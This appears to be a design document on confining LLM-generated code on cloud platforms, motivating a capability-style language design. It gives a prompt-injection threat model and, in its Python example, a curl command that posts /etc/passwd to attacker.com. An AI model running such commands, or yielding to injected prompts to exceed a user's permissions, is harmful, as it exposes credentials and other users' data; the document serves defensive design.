# The AI Security Problem

Large-language models (LLMs) are extremely powerful at generating code to automate tasks. However, cloud platforms cannot fully embrace this power: through _prompt injection_ a user can trick the LLM to generate malicious code that endangers the platform.

## Threat Model

**Attacker**: A malicious user who crafts prompts to manipulate LLM-generated code.

**Attack vector**: Prompt injection causes the LLM to generate code that exceeds the user's authorized permissions.

**Attacker goals**:

- Access other users' data
- Escalate privileges beyond granted permissions
- Exfiltrate data to external endpoints

**Trust boundary**: The interface between platform-provided APIs and LLM-generated code. Code inside this boundary is untrusted; code outside (platform APIs) is trusted.

## Ambient Authorities

Nearly all popular languages expose powerful ambient authorities to programs:

- Global variables
- File system access
- Network access
- System calls
- Foreign Function Interface (FFI)
- Reflective language features
- Control flow effects


With such powerful authorities, a program or a function can potentially do anything.
A malicious program with such authorities can steal all the data and hijack the platform.

Consider a task: "read file `report.txt` and summarize it." In Python:

```python
# Intended behavior
content = open("report.txt").read()

# But nothing prevents this:
import os
os.system("curl -X POST https://attacker.com -d @/etc/passwd")
```

The ambient authorities (`os`, `open`, network access) make confinement impossible at the language level.

## The Authority Confinement Problem

What we really want is to confine the behaviors of a LLM-generated program according to specific _security context_.
For cloud platforms, the security context at least contains the current user.
The LLM-generated programs for the user should be at least confined to the current user's permissions on the platform.

It is easy for a platform to specify and implement security-context-aware APIs as a library in a language.
However, even if the API design follows the _principle of least privilege_,
none of the popular languages can enforce that an untrusted program is confined to the APIs due to the ubiquity of ambient authorities.

In fact, the authority confinement problem is a language design challenge:

- How to remove all ambient authorities (any backdoor breaks security) and still make the language easy to use?
- How to represent the security context such that it is invisible to untrusted program while visible in the trusted API implementation?
- How to make the powerful authorities inaccessible to untrusted programs while accessible to trusted API implementation?

## Authorities and Usability

The reason why all popular languages introduce ambient authorities is to
simplify usage.  Imagine a language where all ambient authorities are removed
and there are no global variables, then a lot of authorities need to thread
through in the program to the places where they are used. This creates
significant boilerplate and incurs overhead in programming.

Yes, a secure language must remove ambient authorities.  However, there should
be a convenient way to control and pass authorities in a program. Ideally, the
control should be enforced by the type system and all violations should be
detected at compile-time. The passing of authorities should be mostly automatic
in the call chain except for control gates (similar to airport check).

## Security Context

The security context problem has two dimensions:

- **Representation**: how to represent the security context

- **Encapsulation**: how to make the security context invisible to untrusted programs

To represent security contexts, the authorities provided to the untrusted
program should be stateful. They cannot be just addresses of functions.

To defend against manipulation or forgery of the security context, an easy
solution is to make the authorities abstract and the abstraction should be
checked by a _sound_ static type system.


## Attenuation of Authorities

To differentiate the authorities given to trust/untrusted code, we need
to attenuate the authorities when passing the trust boundary.
To make attenuation of authorities effective, we need

- a mechanism to define fine-grained authorities from coarse-grained authorities, and
- a guarantee that the coarse-grained authorities will not leak via the derived fine-grained authorities

The coarse-grained authorities can leak via the fine-grained authorities if the
language supports Java-like reflection or JavaScript-like object inspection.

For a practical solution to the authority confinement problem, see [Jo's Solution](solution.md).
